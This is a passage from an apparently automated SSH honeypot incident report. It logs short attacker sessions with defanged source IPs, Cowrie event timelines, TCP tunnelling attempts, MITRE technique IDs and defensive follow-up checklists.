| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 10:56:00` | `cowrie.session.connect` |
| `2026-08-24 10:56:01` | `cowrie.client.version` |
| `2026-08-24 10:56:02` | `cowrie.client.kex` |
| `2026-08-24 10:56:05` | `cowrie.login.success` |
| `2026-08-24 10:56:07` | `cowrie.direct-tcpip.request` |
| `2026-08-24 10:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.210.94[.]61` to AbuseIPDB if not already reported
- [ ] Block `46.210.94[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a359682c6f8e

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]197` |
| **First Seen** | 2026-08-24 11:02 |
| **Last Seen** | 2026-08-24 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:02:28` | `cowrie.session.connect` |
| `2026-08-24 11:02:28` | `cowrie.login.success` |
| `2026-08-24 11:02:29` | `cowrie.session.params` |
| `2026-08-24 11:02:29` | `cowrie.command.input` |
| `2026-08-24 11:02:29` | `cowrie.command.input` |
| `2026-08-24 11:02:29` | `cowrie.command.failed` |
| `2026-08-24 11:02:29` | `cowrie.command.input` |
| `2026-08-24 11:02:29` | `cowrie.command.failed` |
| `2026-08-24 11:02:29` | `cowrie.command.input` |
| `2026-08-24 11:02:29` | `cowrie.log.closed` |
| `2026-08-24 11:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]197` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f17cf1051e5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:04 |
| **Last Seen** | 2026-08-24 11:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:04:07` | `cowrie.session.connect` |
| `2026-08-24 11:04:07` | `cowrie.client.version` |
| `2026-08-24 11:04:07` | `cowrie.client.kex` |
| `2026-08-24 11:04:09` | `cowrie.login.success` |
| `2026-08-24 11:04:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:04:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:04:12` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4790103b953c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:04 |
| **Last Seen** | 2026-08-24 11:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:04:12` | `cowrie.session.connect` |
| `2026-08-24 11:04:12` | `cowrie.client.version` |
| `2026-08-24 11:04:12` | `cowrie.client.kex` |
| `2026-08-24 11:04:13` | `cowrie.login.success` |
| `2026-08-24 11:04:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:04:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:04:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-672d4d105dce

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-24 11:11 |
| **Last Seen** | 2026-08-24 11:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:11:19` | `cowrie.session.connect` |
| `2026-08-24 11:11:20` | `cowrie.client.version` |
| `2026-08-24 11:11:20` | `cowrie.client.kex` |
| `2026-08-24 11:11:22` | `cowrie.login.success` |
| `2026-08-24 11:11:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ae5377252c

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-08-24 11:11 |
| **Last Seen** | 2026-08-24 11:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:11:27` | `cowrie.session.connect` |
| `2026-08-24 11:11:28` | `cowrie.client.version` |
| `2026-08-24 11:11:28` | `cowrie.client.kex` |
| `2026-08-24 11:11:32` | `cowrie.login.success` |
| `2026-08-24 11:11:33` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c02b0744bd5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:14 |
| **Last Seen** | 2026-08-24 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:14:17` | `cowrie.session.connect` |
| `2026-08-24 11:14:17` | `cowrie.client.version` |
| `2026-08-24 11:14:17` | `cowrie.client.kex` |
| `2026-08-24 11:14:18` | `cowrie.login.success` |
| `2026-08-24 11:14:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:14:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:14:19` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd52338d06e0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:14 |
| **Last Seen** | 2026-08-24 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:14:21` | `cowrie.session.connect` |
| `2026-08-24 11:14:21` | `cowrie.client.version` |
| `2026-08-24 11:14:21` | `cowrie.client.kex` |
| `2026-08-24 11:14:22` | `cowrie.login.success` |
| `2026-08-24 11:14:22` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:14:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:14:22` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15db61e14520

| Field | Detail |
|---|---|
| **Source IP** | `78.192.21[.]78` |
| **First Seen** | 2026-08-24 11:19 |
| **Last Seen** | 2026-08-24 11:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:19:35` | `cowrie.session.connect` |
| `2026-08-24 11:19:35` | `cowrie.client.version` |
| `2026-08-24 11:19:35` | `cowrie.client.kex` |
| `2026-08-24 11:19:36` | `cowrie.login.success` |
| `2026-08-24 11:19:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.192.21[.]78` to AbuseIPDB if not already reported
- [ ] Block `78.192.21[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173326e9feff

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-08-24 11:19 |
| **Last Seen** | 2026-08-24 11:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:19:41` | `cowrie.session.connect` |
| `2026-08-24 11:19:42` | `cowrie.client.version` |
| `2026-08-24 11:19:42` | `cowrie.client.kex` |
| `2026-08-24 11:19:43` | `cowrie.login.success` |
| `2026-08-24 11:19:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbd0987b75c9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:24 |
| **Last Seen** | 2026-08-24 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:24:08` | `cowrie.session.connect` |
| `2026-08-24 11:24:08` | `cowrie.client.version` |
| `2026-08-24 11:24:09` | `cowrie.client.kex` |
| `2026-08-24 11:24:09` | `cowrie.login.success` |
| `2026-08-24 11:24:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:24:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:24:10` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85bc8e26027a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:24 |
| **Last Seen** | 2026-08-24 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:24:11` | `cowrie.session.connect` |
| `2026-08-24 11:24:11` | `cowrie.client.version` |
| `2026-08-24 11:24:12` | `cowrie.client.kex` |
| `2026-08-24 11:24:13` | `cowrie.login.success` |
| `2026-08-24 11:24:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:24:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:24:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-157caeff0c6d

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-08-24 11:24 |
| **Last Seen** | 2026-08-24 11:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:24:46` | `cowrie.session.connect` |
| `2026-08-24 11:24:47` | `cowrie.client.version` |
| `2026-08-24 11:24:47` | `cowrie.client.kex` |
| `2026-08-24 11:24:49` | `cowrie.login.success` |
| `2026-08-24 11:24:50` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb84cf5a27ff

| Field | Detail |
|---|---|
| **Source IP** | `121.180.27[.]195` |
| **First Seen** | 2026-08-24 11:24 |
| **Last Seen** | 2026-08-24 11:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:24:54` | `cowrie.session.connect` |
| `2026-08-24 11:24:55` | `cowrie.client.version` |
| `2026-08-24 11:24:55` | `cowrie.client.kex` |
| `2026-08-24 11:24:57` | `cowrie.login.success` |
| `2026-08-24 11:24:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.180.27[.]195` to AbuseIPDB if not already reported
- [ ] Block `121.180.27[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d4d28dd88c5

| Field | Detail |
|---|---|
| **Source IP** | `94.191.86[.]165` |
| **First Seen** | 2026-08-24 11:24 |
| **Last Seen** | 2026-08-24 11:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:24:55` | `cowrie.session.connect` |
| `2026-08-24 11:24:56` | `cowrie.client.version` |
| `2026-08-24 11:24:56` | `cowrie.client.kex` |
| `2026-08-24 11:24:58` | `cowrie.login.success` |
| `2026-08-24 11:24:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.191.86[.]165` to AbuseIPDB if not already reported
- [ ] Block `94.191.86[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef02ecf75ed9

| Field | Detail |
|---|---|
| **Source IP** | `109.186.74[.]107` |
| **First Seen** | 2026-08-24 11:25 |
| **Last Seen** | 2026-08-24 11:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:25:03` | `cowrie.session.connect` |
| `2026-08-24 11:25:04` | `cowrie.client.version` |
| `2026-08-24 11:25:04` | `cowrie.client.kex` |
| `2026-08-24 11:25:05` | `cowrie.login.success` |
| `2026-08-24 11:25:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.186.74[.]107` to AbuseIPDB if not already reported
- [ ] Block `109.186.74[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0733da933e56

| Field | Detail |
|---|---|
| **Source IP** | `68.198.1[.]144` |
| **First Seen** | 2026-08-24 11:27 |
| **Last Seen** | 2026-08-24 11:29 |
| **Session Duration** | 155s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:27:11` | `cowrie.session.connect` |
| `2026-08-24 11:27:12` | `cowrie.client.version` |
| `2026-08-24 11:27:27` | `cowrie.client.kex` |
| `2026-08-24 11:29:01` | `cowrie.login.success` |
| `2026-08-24 11:29:33` | `cowrie.session.params` |
| `2026-08-24 11:29:33` | `cowrie.command.input` |
| `2026-08-24 11:29:46` | `cowrie.log.closed` |
| `2026-08-24 11:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.198.1[.]144` to AbuseIPDB if not already reported
- [ ] Block `68.198.1[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa0fba05909

| Field | Detail |
|---|---|
| **Source IP** | `82.64.88[.]208` |
| **First Seen** | 2026-08-24 11:28 |
| **Last Seen** | 2026-08-24 11:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:28:12` | `cowrie.session.connect` |
| `2026-08-24 11:28:12` | `cowrie.client.version` |
| `2026-08-24 11:28:12` | `cowrie.client.kex` |
| `2026-08-24 11:28:13` | `cowrie.login.success` |
| `2026-08-24 11:28:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.64.88[.]208` to AbuseIPDB if not already reported
- [ ] Block `82.64.88[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5431405ac621

| Field | Detail |
|---|---|
| **Source IP** | `200.170.213[.]9` |
| **First Seen** | 2026-08-24 11:28 |
| **Last Seen** | 2026-08-24 11:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:28:17` | `cowrie.session.connect` |
| `2026-08-24 11:28:18` | `cowrie.client.version` |
| `2026-08-24 11:28:18` | `cowrie.client.kex` |
| `2026-08-24 11:28:20` | `cowrie.login.success` |
| `2026-08-24 11:28:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.170.213[.]9` to AbuseIPDB if not already reported
- [ ] Block `200.170.213[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-438c5d6267a7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:33 |
| **Last Seen** | 2026-08-24 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:33:33` | `cowrie.session.connect` |
| `2026-08-24 11:33:33` | `cowrie.client.version` |
| `2026-08-24 11:33:33` | `cowrie.client.kex` |
| `2026-08-24 11:33:34` | `cowrie.login.success` |
| `2026-08-24 11:33:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:33:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:33:34` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6e0d6d2c01

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:33 |
| **Last Seen** | 2026-08-24 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:33:37` | `cowrie.session.connect` |
| `2026-08-24 11:33:37` | `cowrie.client.version` |
| `2026-08-24 11:33:37` | `cowrie.client.kex` |
| `2026-08-24 11:33:38` | `cowrie.login.success` |
| `2026-08-24 11:33:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:33:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:33:38` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0264d3629b46

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:43 |
| **Last Seen** | 2026-08-24 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:43:11` | `cowrie.session.connect` |
| `2026-08-24 11:43:11` | `cowrie.client.version` |
| `2026-08-24 11:43:11` | `cowrie.client.kex` |
| `2026-08-24 11:43:12` | `cowrie.login.success` |
| `2026-08-24 11:43:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:43:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:43:12` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f7adc562f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 11:43 |
| **Last Seen** | 2026-08-24 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:43:15` | `cowrie.session.connect` |
| `2026-08-24 11:43:15` | `cowrie.client.version` |
| `2026-08-24 11:43:15` | `cowrie.client.kex` |
| `2026-08-24 11:43:16` | `cowrie.login.success` |
| `2026-08-24 11:43:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:43:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 11:43:16` | `cowrie.direct-tcpip.data` |
| `2026-08-24 11:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17153fb51d69

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-08-24 11:43 |
| **Last Seen** | 2026-08-24 11:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 11:43:48` | `cowrie.session.connect` |
| `2026-08-24 11:43:49` | `cowrie.client.version` |
| `2026-08-24 11:43:49` | `cowrie.client.kex` |
| `2026-08-24 11:43:50` | `cowrie.login.success` |
| `2026-08-24 11:43:50` | `cowrie.direct-tcpip.request` |
| `2026-08-24 11:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b5a95c6f2d

| Field | Detail |
|---|---|
| **Source IP** | `176.204.245[.]220` |
| **First Seen** | 2026-08-24 11:47 |
| **Last Seen** | 2026-08-24 11:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
